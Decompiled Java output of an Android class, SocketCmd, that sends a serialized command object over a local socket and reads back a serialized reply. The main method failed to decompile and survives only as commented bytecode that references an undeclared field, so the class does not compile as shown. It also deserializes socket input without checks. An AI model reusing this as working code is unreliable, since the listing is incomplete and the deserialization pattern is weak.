package com.fx.socket;

import com.vvt.ak.a;
import java.io.Serializable;

public abstract class SocketCmd
  implements Serializable
{
  private static final boolean a = false;
  private static final boolean b = a.e;
  private static final long serialVersionUID = -4869566531156547295L;
  private Object mData;
  private Class mResponseKeyClass;
  
  static
  {
    boolean bool = a.a;
    if (bool) {}
  }
  
  public SocketCmd(Object paramObject, Class paramClass)
  {
    this.mData = paramObject;
    this.mResponseKeyClass = paramClass;
  }
  
  /* Error */
  public Object execute()
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: getstatic 24	com/fx/socket/SocketCmd:a	Z
    //   5: istore_2
    //   6: iload_2
    //   7: ifeq +3 -> 10
    //   10: new 39	android/net/LocalSocket
    //   13: astore_3
    //   14: aload_3
    //   15: invokespecial 40	android/net/LocalSocket:<init>	()V
    //   18: getstatic 24	com/fx/socket/SocketCmd:a	Z
    //   21: istore_2
    //   22: iload_2
    //   23: ifeq +3 -> 26
    //   26: new 42	android/net/LocalSocketAddress
    //   29: astore 4
    //   31: aload_0
    //   32: invokevirtual 46	com/fx/socket/SocketCmd:getServerName	()Ljava/lang/String;
    //   35: astore 5
    //   37: aload 4
    //   39: aload 5
    //   41: invokespecial 49	android/net/LocalSocketAddress:<init>	(Ljava/lang/String;)V
    //   44: aload_3
    //   45: aload 4
    //   47: invokevirtual 53	android/net/LocalSocket:connect	(Landroid/net/LocalSocketAddress;)V
    //   50: getstatic 24	com/fx/socket/SocketCmd:a	Z
    //   53: istore_2
    //   54: iload_2
    //   55: ifeq +3 -> 58
    //   58: new 55	java/io/ObjectOutputStream
    //   61: astore 6
    //   63: aload_3
    //   64: invokevirtual 59	android/net/LocalSocket:getOutputStream	()Ljava/io/OutputStream;
    //   67: astore 4
    //   69: aload 6
    //   71: aload 4
    //   73: invokespecial 62	java/io/ObjectOutputStream:<init>	(Ljava/io/OutputStream;)V
    //   76: aload 6
    //   78: aload_0
    //   79: invokevirtual 66	java/io/ObjectOutputStream:writeObject	(Ljava/lang/Object;)V
    //   82: aload 6
    //   84: invokevirtual 69	java/io/ObjectOutputStream:flush	()V
    //   87: getstatic 24	com/fx/socket/SocketCmd:a	Z
    //   90: istore_2
    //   91: iload_2
    //   92: ifeq +3 -> 95
    //   95: new 71	java/io/ObjectInputStream
    //   98: astore 5
    //   100: aload_3
    //   101: invokevirtual 75	android/net/LocalSocket:getInputStream	()Ljava/io/InputStream;
    //   104: astore 4
    //   106: aload 5
    //   108: aload 4
    //   110: invokespecial 78	java/io/ObjectInputStream:<init>	(Ljava/io/InputStream;)V
    //   113: aload 5
    //   115: invokevirtual 82	java/io/ObjectInputStream:readObject	()Ljava/lang/Object;
    //   118: astore 4
    //   120: getstatic 24	com/fx/socket/SocketCmd:a	Z
    //   123: istore 7
    //   125: iload 7
    //   127: ifeq +3 -> 130
    //   130: aload_0
    //   131: getfield 37	com/fx/socket/SocketCmd:mResponseKeyClass	Ljava/lang/Class;
    //   134: astore 8
    //   136: aload 8
    //   138: aload 4
    //   140: invokevirtual 88	java/lang/Class:cast	(Ljava/lang/Object;)Ljava/lang/Object;
    //   143: astore 4
    //   145: aload 6
    //   147: ifnull +8 -> 155
    //   150: aload 6
    //   152: invokevirtual 91	java/io/ObjectOutputStream:close	()V
    //   155: aload 5
    //   157: ifnull +8 -> 165
    //   160: aload 5
    //   162: invokevirtual 92	java/io/ObjectInputStream:close	()V
    //   165: aload_3
    //   166: ifnull +7 -> 173
    //   169: aload_3
    //   170: invokevirtual 93	android/net/LocalSocket:close	()V
    //   173: aload_1
    //   174: ifnull +241 -> 415
    //   177: new 95	java/io/IOException
    //   180: astore 4
    //   182: aload_1
    //   183: checkcast 97	java/lang/Exception
    //   186: invokevirtual 100	java/lang/Exception:toString	()Ljava/lang/String;
    //   189: astore_3
    //   190: aload 4
    //   192: aload_3
    //   193: invokespecial 101	java/io/IOException:<init>	(Ljava/lang/String;)V
    //   196: aload 4
    //   198: athrow
    //   199: astore_3
    //   200: getstatic 29	com/fx/socket/SocketCmd:removeFromPath	Z
    //   203: istore 9
    //   205: iload 9
    //   207: ifeq -34 -> 173
    //   210: goto -37 -> 173
    //   213: astore 4
    //   215: iconst_0
    //   216: istore 9
    //   218: aconst_null
    //   219: astore_3
    //   220: aconst_null
    //   221: astore 5
    //   223: aconst_null
    //   224: astore 6
    //   226: aload 4
    //   228: instanceof 95
    //   231: istore 7
    //   233: iload 7
    //   235: ifeq +92 -> 327
    //   238: ldc 103
    //   240: astore 8
    //   242: aload 4
    //   244: checkcast 97	java/lang/Exception
    //   247: invokevirtual 106	java/lang/Exception:getMessage	()Ljava/lang/String;
    //   250: astore 10
    //   252: aload 8
    //   254: aload 10
    //   256: invokevirtual 112	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   259: istore 7
    //   261: iload 7
    //   263: ifeq +64 -> 327
    //   266: iconst_1
    //   267: istore 7
    //   269: iload 7
    //   271: ifne +13 -> 284
    //   274: getstatic 29	com/fx/socket/SocketCmd:removeFromPath	Z
    //   277: istore 7
    //   279: iload 7
    //   281: ifeq +3 -> 284
    //   284: aload 6
    //   286: ifnull +8 -> 294
    //   289: aload 6
    //   291: invokevirtual 91	java/io/ObjectOutputStream:close	()V
    //   294: aload 5
    //   296: ifnull +8 -> 304
    //   299: aload 5
    //   301: invokevirtual 92	java/io/ObjectInputStream:close	()V
    //   304: aload_3
    //   305: ifnull +7 -> 312
    //   308: aload_3
    //   309: invokevirtual 93	android/net/LocalSocket:close	()V
    //   312: aload 4
    //   314: astore 11
    //   316: iconst_0
    //   317: istore_2
    //   318: aconst_null
    //   319: astore 4
    //   321: aload 11
    //   323: astore_1
    //   324: goto -151 -> 173
    //   327: iconst_0
    //   328: istore 7
    //   330: aconst_null
    //   331: astore 8
    //   333: goto -64 -> 269
    //   336: astore_3
    //   337: getstatic 29	com/fx/socket/SocketCmd:removeFromPath	Z
    //   340: istore 9
    //   342: iload 9
    //   344: ifeq +3 -> 347
    //   347: aload 4
    //   349: astore 11
    //   351: iconst_0
    //   352: istore_2
    //   353: aconst_null
    //   354: astore 4
    //   356: aload 11
    //   358: astore_1
    //   359: goto -186 -> 173
    //   362: astore 4
    //   364: iconst_0
    //   365: istore 9
    //   367: aconst_null
    //   368: astore_3
    //   369: aconst_null
    //   370: astore 6
    //   372: aload 6
    //   374: ifnull +8 -> 382
    //   377: aload 6
    //   379: invokevirtual 91	java/io/ObjectOutputStream:close	()V
    //   382: aload_1
    //   383: ifnull +7 -> 390
    //   386: aload_1
    //   387: invokevirtual 92	java/io/ObjectInputStream:close	()V
    //   390: aload_3
    //   391: ifnull +7 -> 398
    //   394: aload_3
    //   395: invokevirtual 93	android/net/LocalSocket:close	()V
    //   398: aload 4
    //   400: athrow
    //   401: astore_3
    //   402: getstatic 29	com/fx/socket/SocketCmd:removeFromPath	Z
    //   405: istore 9
    //   407: iload 9
    //   409: ifeq -11 -> 398
    //   412: goto -14 -> 398
    //   415: getstatic 24	com/fx/socket/SocketCmd:a	Z
    //   418: istore 9
    //   420: iload 9
    //   422: ifeq +3 -> 425
    //   425: aload 4
    //   427: areturn
    //   428: astore 4
    //   430: aconst_null
    //   431: astore 6
    //   433: goto -61 -> 372
    //   436: astore 4
    //   438: goto -66 -> 372
    //   441: astore 4
    //   443: aload 5
    //   445: astore_1
    //   446: goto -74 -> 372
    //   449: astore 4
    //   451: aconst_null
    //   452: astore 5
    //   454: aconst_null
    //   455: astore 6
    //   457: goto -231 -> 226
    //   460: astore 4
    //   462: aconst_null
    //   463: astore 5
    //   465: goto -239 -> 226
    //   468: astore 4
    //   470: goto -244 -> 226
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	473	0	this	SocketCmd
    //   1	445	1	localObject1	Object
    //   5	348	2	bool1	boolean
    //   13	180	3	localObject2	Object
    //   199	1	3	localIOException1	java.io.IOException
    //   219	90	3	localObject3	Object
    //   336	1	3	localIOException2	java.io.IOException
    //   368	27	3	localObject4	Object
    //   401	1	3	localIOException3	java.io.IOException
    //   29	168	4	localObject5	Object
    //   213	100	4	localException1	Exception
    //   319	36	4	localObject6	Object
    //   362	64	4	localObject7	Object
    //   428	1	4	localObject8	Object
    //   436	1	4	localObject9	Object
    //   441	1	4	localObject10	Object
    //   449	1	4	localException2	Exception
    //   460	1	4	localException3	Exception
    //   468	1	4	localException4	Exception
    //   35	429	5	localObject11	Object
    //   61	395	6	localObjectOutputStream	java.io.ObjectOutputStream
    //   123	206	7	bool2	boolean
    //   134	198	8	localObject12	Object
    //   203	218	9	bool3	boolean
    //   250	5	10	str	String
    //   314	43	11	localObject13	Object
    // Exception table:
    //   from	to	target	type
    //   150	155	199	java/io/IOException
    //   160	165	199	java/io/IOException
    //   169	173	199	java/io/IOException
    //   10	13	213	java/lang/Exception
    //   14	18	213	java/lang/Exception
    //   289	294	336	java/io/IOException
    //   299	304	336	java/io/IOException
    //   308	312	336	java/io/IOException
    //   10	13	362	finally
    //   14	18	362	finally
    //   377	382	401	java/io/IOException
    //   386	390	401	java/io/IOException
    //   394	398	401	java/io/IOException
    //   18	21	428	finally
    //   26	29	428	finally
    //   31	35	428	finally
    //   39	44	428	finally
    //   45	50	428	finally
    //   50	53	428	finally
    //   58	61	428	finally
    //   63	67	428	finally
    //   71	76	428	finally
    //   78	82	436	finally
    //   82	87	436	finally
    //   87	90	436	finally
    //   95	98	436	finally
    //   100	104	436	finally
    //   108	113	436	finally
    //   113	118	441	finally
    //   120	123	441	finally
    //   130	134	441	finally
    //   138	143	441	finally
    //   242	250	441	finally
    //   254	259	441	finally
    //   274	277	441	finally
    //   18	21	449	java/lang/Exception
    //   26	29	449	java/lang/Exception
    //   31	35	449	java/lang/Exception
    //   39	44	449	java/lang/Exception
    //   45	50	449	java/lang/Exception
    //   50	53	449	java/lang/Exception
    //   58	61	449	java/lang/Exception
    //   63	67	449	java/lang/Exception
    //   71	76	449	java/lang/Exception
    //   78	82	460	java/lang/Exception
    //   82	87	460	java/lang/Exception
    //   87	90	460	java/lang/Exception
    //   95	98	460	java/lang/Exception
    //   100	104	460	java/lang/Exception
    //   108	113	460	java/lang/Exception
    //   113	118	468	java/lang/Exception
    //   120	123	468	java/lang/Exception
    //   130	134	468	java/lang/Exception
    //   138	143	468	java/lang/Exception
  }
  
  public Object getData()
  {
    return this.mData;
  }
  
  protected abstract String getServerName();
  
  protected abstract String getTag();
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/fx/socket/SocketCmd.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */